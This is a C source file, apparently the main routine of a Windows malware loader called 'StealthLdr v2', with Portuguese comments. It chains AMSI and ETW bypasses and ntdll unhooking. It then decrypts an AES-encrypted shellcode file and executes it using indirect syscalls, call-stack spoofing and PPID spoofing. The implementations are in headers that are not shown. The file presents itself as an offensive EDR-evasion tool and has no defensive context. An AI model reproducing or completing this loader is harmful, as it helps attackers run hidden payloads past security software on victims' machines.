#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "spoofing.h"
#include "injection.h"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Uso: %s <shellcode.enc>\n", argv[0]);
        return 1;
    }

    printf("[+] StealthLdr v2 - EDR Evasion Avançada 2026\n");

    // Evasões
    PatchlessAMSI_Bypass();
    PatchlessETW_Bypass();
    UnhookNtdllBasic();

    // Carregar e descriptografar
    SIZE_T encSize = 0;
    PBYTE encrypted = ReadEncryptedFile(argv[1], &encSize);
    if (!encrypted) return 1;

    SIZE_T shellSize = 0;
    PBYTE shellcode = AES_Decrypt(encrypted, encSize, &shellSize);
    free(encrypted);

    if (!shellcode) {
        printf("[-] Falha na descriptografia\n");
        return 1;
    }

    InitIndirectSyscalls();
    SpoofCallStack();

    // Execução avançada com PPID Spoofing
    ExecuteShellcodeAdvanced(shellcode, shellSize);

    free(shellcode);
    printf("[+] Shellcode executado com sucesso!\n");
    return 0;
}
